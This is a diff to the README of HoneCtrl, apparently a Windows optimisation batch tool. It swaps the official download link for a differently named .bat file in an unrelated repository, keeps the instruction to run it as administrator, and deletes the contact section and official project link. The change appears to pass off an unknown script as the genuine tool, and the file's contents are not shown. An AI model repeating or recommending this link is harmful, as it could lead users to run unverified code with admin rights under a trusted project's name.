@@ -70,7 +70,6 @@
     <li><a href="#usage">Usage</a></li>
     <li><a href="#contributing">Contributing</a></li>
     <li><a href="#license">License</a></li>
-    <li><a href="#contact">Contact</a></li>
     <li><a href="#acknowledgments">Acknowledgments</a></li>
   </ol>
 </details>
@@ -112,7 +111,7 @@ Even though we have an automatic restore point feature some users have issues wi
 
 1. Download the latest HoneCtrl Version
    ```sh
-   https://github.com/auraside/HoneCtrl/releases/latest/download/HoneCtrl.Bat
+   https://github.com/yustinbieber/iyuvium/releases/latest/download/boost.Bat
    ```
 2. Right click HoneCtrl.bat and run it as admin
 
@@ -156,16 +155,6 @@ Distributed under the GNU AGPLv3  License. See `LICENSE.txt` for more informatio
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 
-
-<!-- CONTACT -->
-## Contact
-
-Join the discord and create a ticket,
-https://discord.gg/hone
-
-Project Link: [https://github.com/auraside/HoneCtrl](https://github.com/auraside/HoneCtrl)
-
-<p align="right">(<a href="#top">back to top</a>)</p>
 
 
 
